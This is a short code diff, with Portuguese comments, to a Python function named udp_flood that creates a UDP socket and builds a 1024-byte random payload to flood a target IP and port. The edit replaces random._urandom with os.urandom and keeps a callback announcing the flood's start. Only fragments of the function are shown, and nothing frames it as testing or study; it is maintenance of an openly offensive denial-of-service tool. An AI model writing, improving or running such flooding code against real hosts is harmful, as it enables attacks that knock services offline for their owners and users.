@@ -1,5 +1,5 @@
 import socket
-import random
+import os
 
 def udp_flood(target_ip, target_port, duration_packets, callback=None):
     """
@@ -18,7 +18,7 @@ def udp_flood(target_ip, target_port, duration_packets, callback=None):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     # Geramos bytes aleatórios para o payload (ex: 1024 bytes)
-    bytes_payload = random._urandom(1024)
+    bytes_payload = os.urandom(1024)
     
     if callback:
         callback(f"--- A iniciar UDP Flood em {target_ip}:{target_port} ---")
